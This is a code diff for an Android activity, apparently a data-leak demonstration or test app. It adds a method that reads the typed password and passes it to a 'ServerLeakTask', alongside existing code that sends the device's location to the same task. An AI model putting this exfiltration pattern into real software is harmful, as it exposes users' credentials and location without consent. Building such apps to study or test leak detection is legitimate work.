@@ -130,6 +130,17 @@ public class Main extends AppCompatActivity {
 
     }
 
+
+    public void leakPasswd(View v){
+        EditText et = (EditText)findViewById(R.id.main_et_passwd);
+        String pass = et.getText().toString();
+
+        prependToLog("Leaked Password: " + pass);
+
+        ServerLeakTask slt = new ServerLeakTask();
+        slt.execute(pass);
+    }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
         switch (requestCode) {
@@ -235,22 +246,26 @@ public class Main extends AppCompatActivity {
     }
 
     public void leakLoc(Location loc){
-        TextView tv = (TextView)findViewById(R.id.main_tv_log);
-        StringBuffer sb = new StringBuffer();
 
         SimpleDateFormat mdformat = new SimpleDateFormat("HH:mm:ss");
         String strDate = mdformat.format(Calendar.getInstance().getTime());
 
-        String newPart = "Leaked Location: (" + loc.getLatitude() + ", " + loc.getLongitude() + ") at " + strDate + "\n";
-        sb.append(newPart);
-        sb.append(tv.getText().toString());
-        tv.setText(sb.toString());
+        String newPart = "Leaked Location: (" + loc.getLatitude() + ", " + loc.getLongitude() + ") at " + strDate;
+        prependToLog(newPart);
 
         ServerLeakTask slt = new ServerLeakTask();
         slt.execute(newPart);
-
-
     }
+
+    private void prependToLog(String newPart){
+        TextView tv = (TextView)findViewById(R.id.main_tv_log);
+        StringBuffer sb = new StringBuffer();
+
+        sb.append(newPart + "\n");
+        sb.append(tv.getText().toString());
+        tv.setText(sb.toString());
+    }
+
 
     class ServerLeakTask extends AsyncTask<String, Void, Void> {
         protected void onPreExecute(){
